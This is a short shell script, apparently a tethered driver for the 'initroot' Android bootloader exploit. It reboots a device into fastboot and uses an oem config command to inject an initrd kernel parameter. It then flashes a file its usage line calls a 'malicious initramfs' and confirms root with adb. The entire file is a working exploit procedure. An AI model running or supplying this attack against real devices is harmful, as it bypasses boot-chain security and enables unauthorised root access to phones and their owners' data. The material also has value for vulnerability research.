#!/bin/sh

# usage: ./initroot-tethered.sh <name> <initrd address> <initrd start> <malicious initramfs>
# use the device specific initroot.sh which uses this file with the right parameters

echo Welcome to initroot-$1-tethered
adb shell id
adb reboot bootloader
fastboot oem config fsg-id "a initrd=$2,$3"
fastboot flash aleph $4
fastboot continue
adb wait-for-device
adb shell id
